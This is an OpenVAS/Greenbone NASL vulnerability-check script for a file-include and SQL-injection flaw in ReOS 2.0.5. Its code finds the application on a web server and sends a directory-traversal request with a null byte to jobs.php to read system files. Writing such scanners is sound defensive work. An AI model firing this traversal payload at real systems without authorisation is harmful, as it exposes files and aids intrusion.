if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103061" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-02-04 13:23:33 +0100 (Fri, 04 Feb 2011)" );
	script_bugtraq_id( 46134 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "ReOS Local File Include and SQL Injection Vulnerabilities" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/46134" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/516154" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/516155" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/516152" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/516149" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/516156" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "ReOS is prone to a local file-include vulnerability and multiple SQL-
  injection vulnerabilities because it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit the local file-include vulnerability using directory-
  traversal strings to view and execute arbitrary local files within the context of the affected application.
  Information harvested may aid in further attacks.

  The attacker can exploit the SQL-injection vulnerabilities to compromise the application, access or modify data,
  exploit latent vulnerabilities in the underlying database, or bypass the authentication control." );
	script_tag( name: "affected", value: "ReOS 2.0.5 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/reos", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	buf = http_get_cache( item: dir + "/index.php", port: port );
	if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) || ( !ContainsString( buf, "content=\"real state, for sale" ) && !ContainsString( buf, "Powered by" ) && !ContainsString( buf, ">eLazos</a>" ) )){
		continue;
	}
	for file in keys( files ) {
		url = NASLString( dir, "/jobs.php?lang=", crap( data: "../", length: 3 * 9 ), files[file], "%00" );
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

